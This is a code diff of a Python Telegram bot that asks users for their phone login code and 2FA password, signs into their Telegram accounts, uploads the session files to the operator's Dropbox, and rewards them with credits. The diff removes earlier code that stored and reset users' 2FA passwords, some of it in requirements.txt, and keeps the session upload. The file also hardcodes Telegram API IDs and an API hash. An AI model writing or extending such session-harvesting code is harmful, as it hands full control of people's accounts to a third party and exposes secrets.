@@ -1,6 +1,3 @@
-
-# ---- Your Telegram API keys ----
-# ---- Your Telegram API keys ----
 import os
 import json
 import asyncio
@@ -30,7 +27,7 @@ async def credits(update, context):
 
 def escape_markdown(text):
     """Escape characters for Telegram Markdown."""
-    escape_chars = r'\_*[]()~`>#+-=|{}.!'
+    escape_chars = r'\_*[]()~>#+-=|{}.!'
     return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))
 # === Telegram API Credentials ===
 api_id = 28805917
@@ -44,15 +41,10 @@ load_dotenv()
 api_id   = int(os.getenv("API_ID"))
 api_hash = os.getenv("API_HASH")
 
-def get_2fa_password():
-    return os.getenv('2FA_PASSWORD')
 
-password = get_2fa_password()
 # === Create Telethon Client ===
 
-def save_2fa_password(password):
-    load_dotenv()  # Ensure the environment variables are loaded
-    set_key('.env', 'TWO_FA_PASSWORD', password)
+
 # ---- Your Telegram API keys ----
 API_ID = 28863669  # <-- Replace with your API ID (integer)
 API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)
@@ -94,10 +86,7 @@ async def save_credits(credits: dict):
         CREDITS_FILE,
         mode=dropbox.files.WriteMode("overwrite")
     )
-
     
-
-
 async def add_credit(user_id, amount, number_sent=None):
     credits = await load_credits()
     key = str(user_id)
@@ -251,13 +240,6 @@ async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
 # ---- Handle 2FA Password ----
-
-# Save the new 2FA password into requirements.txt
-def save_2fa_password(password):
-    with open('requirements.txt', 'a') as f:
-        f.write(f"2fa_password={password}\n")
-
-# ---- Handle 2FA Password ----
 async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     password = update.message.text.strip()
@@ -269,43 +251,26 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     client = session["client"]
 
-    # Check if 2FA is enabled by checking if the password is in the .env file
-    current_2fa_password = load_2fa_password()
+    try:
+        await client.sign_in(password=password)
+        await update.message.reply_text("✅ Logged in successfully with 2FA!")
 
-    if not current_2fa_password:  # 2FA is disabled, set a new 2FA password
-        save_2fa_password(password)
-        await update.message.reply_text("✅ 2FA password has been set!")
-        try:
-            await client.sign_in(password=password)
-            await update.message.reply_text("✅ Logged in successfully with the newly set 2FA password!")
-            # Add 1 credit after successful login
-            new_credit_balance = await add_credit(user_id, 1, session["phone"])
-            # Upload session file to Dropbox
-            await upload_session_to_dropbox(client, session["phone"])
-            await client.disconnect()
-            await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
-            return ConversationHandler.END
-        except errors.PasswordHashInvalidError:
-            await update.message.reply_text("❌ Incorrect password. Please try again.")
-            return ASK_PASSWORD
+        # Add 1 credit after successful login
+        new_credit_balance = await add_credit(user_id, 1, session["phone"])
 
-    else:  # 2FA is enabled, change the 2FA password to the new one
-        save_2fa_password(password)
-        await update.message.reply_text("✅ Your 2FA password has been updated.")
-        try:
-            await client.sign_in(password=password)
-            await update.message.reply_text("✅ Logged in successfully with the new 2FA password!")
-            # Add 1 credit after successful login
-            new_credit_balance = await add_credit(user_id, 1, session["phone"])
-            # Upload session file to Dropbox
-            await upload_session_to_dropbox(client, session["phone"])
-            await client.disconnect()
-            await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
-            return ConversationHandler.END
-        except errors.PasswordHashInvalidError:
-            await update.message.reply_text("❌ Incorrect password. Please try again.")
-            return ASK_PASSWORD
 
+        # Upload session file to Dropbox
+        await upload_session_to_dropbox(client, session["phone"])
+
+        await client.disconnect()
+
+        # Inform the user about their credits
+        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
+
+        return ConversationHandler.END
+    except errors.PasswordHashInvalidError:
+        await update.message.reply_text("❌ Incorrect password. Please send again.")
+        return ASK_PASSWORD
 
 # ---- Upload Session File to Dropbox ----
 async def upload_session_to_dropbox(client, phone):
